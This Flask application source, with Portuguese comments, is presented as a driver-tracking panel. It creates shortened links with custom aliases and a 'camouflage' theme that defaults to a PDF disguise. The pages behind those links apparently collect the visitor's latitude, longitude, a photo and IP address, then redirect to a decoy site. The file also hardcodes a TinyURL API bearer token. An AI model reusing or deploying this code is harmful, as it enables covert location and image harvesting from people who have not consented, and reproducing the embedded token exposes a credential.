from flask import Flask, render_template, request, jsonify, redirect, url_for
import uuid
from datetime import datetime
import os
import requests
import pytz

app = Flask(__name__)
FROTA = {}

# TOKEN TINYURL
TOKEN_TINYURL = "z1TYfa105Sj4DxK1t7LYkGBzuHO06KDd5z0jj0mUYiEeNBzh4ZT7ItMXvtbz"

def encurtar_url(url_longa, alias=None):
    if "127.0.0.1" in url_longa or "localhost" in url_longa: return url_longa
    headers = { "Authorization": f"Bearer {TOKEN_TINYURL}", "Content-Type": "application/json" }
    payload = { "url": url_longa, "domain": "tinyurl.com" }
    if alias and alias.strip(): payload["alias"] = alias.strip().replace(" ", "-")
    try:
        r = requests.post("https://api.tinyurl.com/create", json=payload, headers=headers, timeout=10)
        if r.status_code in [200, 201]: return r.json()["data"]["tiny_url"]
        else:
            r_fb = requests.post("https://api.tinyurl.com/create", json={"url": url_longa, "domain": "tinyurl.com"}, headers=headers, timeout=10)
            return r_fb.json()["data"]["tiny_url"] if r_fb.status_code in [200, 201] else url_longa
    except: return url_longa

@app.route('/')
def index(): return redirect(url_for('admin_panel'))

@app.route('/admin')
def admin_panel(): return render_template("admin.html", frota=FROTA)

@app.route('/gerar_ordem', methods=['POST'])
def gerar_ordem():
    motorista = request.form.get("motorista")
    personalizacao = request.form.get("personalizacao")
    
    # ATENÇÃO AQUI: O nome do campo no HTML agora é "camuflagem"
    tema = request.form.get("camuflagem") 
    
    redirect_url = request.form.get("redirect") or "https://www.google.com"

    id_ordem = str(uuid.uuid4())[:8]
    link_longo = url_for('tela_motorista', id_ordem=id_ordem, _external=True)
    link_curto = encurtar_url(link_longo, alias=personalizacao)
    
    FROTA[id_ordem] = {
        "motorista": motorista, "lat": None, "lon": None, "foto": None,
        "status": "Aguardando Conexão", "ultimo_visto": "-", "link": link_curto,
        "redirect": redirect_url, "ip": "-", 
        "tema": tema 
    }
    return redirect(url_for('admin_panel'))

@app.route('/verificar-entrega/<id_ordem>')
def tela_motorista(id_ordem):
    if id_ordem not in FROTA: return "Link expirado.", 404
    dados = FROTA[id_ordem]
    return render_template("motorista.html", id=id_ordem, destino=dados["redirect"], tema=dados.get("tema", "pdf"))

@app.route('/api/sinal/<id_ordem>', methods=['POST'])
def receber_sinal(id_ordem):
    if id_ordem in FROTA:
        data = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        # HORÁRIO BRASÍLIA
        fuso_br = pytz.timezone('America/Sao_Paulo')
        agora_br = datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
        
        FROTA[id_ordem].update({
            'lat': data.get('latitude'), 'lon': data.get('longitude'), 'foto': data.get('foto'),
            'status': "🟢 Online", 'ultimo_visto': agora_br, 'ip': ip
        })
        return jsonify({"ok": True})
    return jsonify({"ok": False}), 404

@app.route('/api/frota')
def api_frota(): return jsonify(FROTA)

@app.route('/excluir/<id_ordem>', methods=['DELETE'])
def excluir_ordem(id_ordem):
    if id_ordem in FROTA: del FROTA[id_ordem]
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
